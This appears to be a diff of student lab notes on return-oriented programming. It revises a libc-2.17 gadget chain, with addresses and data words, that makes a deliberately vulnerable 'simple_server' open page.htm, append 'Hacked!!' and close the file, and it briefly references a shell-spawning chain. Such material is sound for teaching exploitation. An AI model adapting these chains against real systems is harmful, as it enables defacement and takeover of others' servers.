@@ -13,7 +13,6 @@ https://gcc.gnu.org/onlinedocs/gcc/Link-Options.html#Link-Options
         run aaa
         info files
 
-
 2. Commands needed to spawn a shell (the data segment addresses are for bin/rop/exploitable)
 
     --> From the ROP tutorial PDF:
@@ -121,28 +120,59 @@ https://gcc.gnu.org/onlinedocs/gcc/Link-Options.html#Link-Options
     ROP command: 0xbaa75L: call dword [gs:0x10] ;;
 
 
-4. Commands needed to append "Hacked!" to "index.html" of the vulnerable server
+4. Commands needed to append "Hacked!" to "page.htm" of the vulnerable server
+
+    Library version - libc-2.17
 
     Data segment of simple_server: 0x0804b088 - 0x0804b090 is .data
 
-    ; Opening the file
-    ROP command: 0xf2d21L: pop ecx ; pop eax ;; Store inde
-    Data       :"inde"
-    Address    : 0x4: Offset for inde (.data base)
-    ROP command: 0x2d71fL: mov [eax] ecx ;; Store x.htm
-    ROP command: 0xf2d21L: pop ecx ; pop eax ;;
-    Data       :"x.htm"
-    Address    : 0x4: Offset for inde (.data base)
-    ROP command: 0x2d71fL: mov [eax] ecx ;;
-    ROP command: 0x2df7bL: pop ecx ; pop edx ;; Store null after index.htm
-    Padding    : 0x01010101 (To neutralize pop ecx)
+    ROP command: 0xf5160L: pop ecx ; pop eax ;; Store page
+    Data       : 0x65676170: page
+    Address    : 0x4: Offset for page (.data base)
+    ROP command: 0x2e09fL: mov [eax] ecx ;;
+    ROP command: 0xf5160L: pop ecx ; pop eax ;;
+    Data       : 0x6d74682e: .htm
+    Address    : 0x8: Offset for .htm (.data base)
+    ROP command: 0x2e09fL: mov [eax] ecx ;;
+    ROP command: 0x742aeL: pop ebx ; ret ; xor eax eax ;; Store address of page.htm in ebx, the xor doesn't work
+    Address    : 0x4: Offset for page (.data base)
+    ROP command: 0x34964L: xor eax eax ;;
+    ROP command: 0x2e8bbL: pop ecx ; pop edx ;; Store null after page.htm
+    Padding    : 0x01010101: (To neutralize pop ecx)
     Address    : 0xc: Offset for NULL (.data base)
-    ROP command: 0x8d5e4L: mov [edx] eax ; mov eax edx ;;
-    ROP command: 0x1820b5L: mov ecx [edx] ;; Clear ecx
-    ROP command: 0x341a5L: xor eax eax ;; Clear eax
-    ROP command: 0xa9a20L: mov eax 0x5 ;; Store 0x5 in eax
-    ROP command: 0x1976eL: pop ebx ;; Store address of index.htm in ebx
-    Address    : 0x4: Offset for inde (.data base)
-    ROP command: 0x17b6d7L: inc ecx ;;
-    ROP command: 0x17b6d7L: inc ecx ;; Store 0x2 in ecx
-    ROP command: EDX needs to contain 0644 or 0x1a4, find a way to do this.
+    ROP command: 0x8e034L: mov [edx] eax ; mov eax edx ;;
+    ROP command: 0x83f67L: xor edx edx ; mov eax edx ;; Clear edx, eax
+    ROP command: 0x2e8bbL: pop ecx ; pop edx ;; Store 0x2
+    Padding    : 0x02020202: (To neutralize pop ecx)
+    Address    : 0x20: Offset for 0x2 (.data base)
+    ROP command: 0x1171f0L: mov eax 0x2 ;;
+    ROP command: 0x8e034L: mov [edx] eax ; mov eax edx ;;
+    ROP command: 0x143f2cL: mov ecx [eax] ; mov [edx] ecx ; pop ebx ;;
+    Address    : 0x4: Offset for page (.data base)
+    ROP command: 0x83f67L: xor edx edx ; mov eax edx ;; Clear edx, eax
+    ROP command: 0xa9a10L: mov eax 0x4 ;;
+    ROP command: 0x41e3aL: inc eax ;; Store 0x5 in eax (we aren't using mov eax 0x5 because its address introduces space and breaks the shellcode)
+    ROP command: 0xbaa75L: call dword [gs:0x10] ;;
+    ROP command: 0x122339L: mov edx eax ; mov eax edx ;; 
+    ROP command: 0xdf572L: mov ebx edx ;; ebx contains fd
+    ROP command: 0xf5160L: pop ecx ; pop eax ;;
+    Data       : 0x6b636148: Hack
+    Address    : 0x10: Offset for Hack (.data base)
+    ROP command: 0x2e09fL: mov [eax] ecx ;;
+    ROP command: 0xf5160L: pop ecx ; pop eax ;;
+    Data       : 0x21216465: ed!!
+    Address    : 0x14: Offset for ed!! (.data base)
+    ROP command: 0x2e09fL: mov [eax] ecx ;;
+    ROP command: 0x34964L: xor eax eax ;;
+    ROP command: 0x2e8bbL: pop ecx ; pop edx ;; Store null after Hacked!!
+    Address    : 0x10: Offset for Hack (.data base)
+    Address    : 0x18: Offset for NULL (.data base)
+    ROP command: 0x8e034L: mov [edx] eax ; mov eax edx ;;
+    ROP command: 0x83f67L: xor edx edx ; mov eax edx ;; Clear edx, eax
+    ROP command: 0xa9a40L: mov eax 0x7 ;;
+    ROP command: 0x41e3aL: inc eax ;;
+    ROP command: 0x122339L: mov edx eax ; mov eax edx ;;
+    ROP command: 0xa9a10L: mov eax 0x4 ;; eax writes into a file
+    ROP command: 0xbaa75L: call dword [gs:0x10] ;;
+    ROP command: 0xa9a30L: mov eax 0x6 ;;
+    ROP command: 0xbaa75L: call dword [gs:0x10] ;;
